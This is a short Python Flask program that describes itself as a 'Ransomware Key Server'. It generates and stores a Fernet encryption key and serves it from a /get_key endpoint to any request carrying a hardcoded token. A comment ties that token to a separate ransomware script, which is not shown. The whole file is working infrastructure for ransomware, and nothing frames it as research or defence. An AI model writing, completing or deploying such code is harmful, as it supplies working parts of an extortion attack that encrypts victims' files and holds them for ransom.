from flask import Flask, jsonify, request, abort
from cryptography.fernet import Fernet
import os

app = Flask(__name__)

KEY_FILE = 'encryption_key.txt'
ACCESS_TOKEN = 'my_secret_token'  # This must match the token used in the ransomware script

def generate_fernet_key() -> str:
    return Fernet.generate_key().decode('utf-8')

# Generate and store key if it doesn't exist
if not os.path.exists(KEY_FILE) or os.path.getsize(KEY_FILE) == 0:
    with open(KEY_FILE, 'w') as f:
        f.write(generate_fernet_key())

with open(KEY_FILE, 'r') as f:
    encryption_key = f.read().strip()

@app.route("/get_key", methods=["GET"])
def get_key():
    token = request.args.get("token")
    if token != ACCESS_TOKEN:
        abort(403)
    return jsonify({"key": encryption_key})

@app.route("/")
def home():
    return " Ransomware Key Server is Running "

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
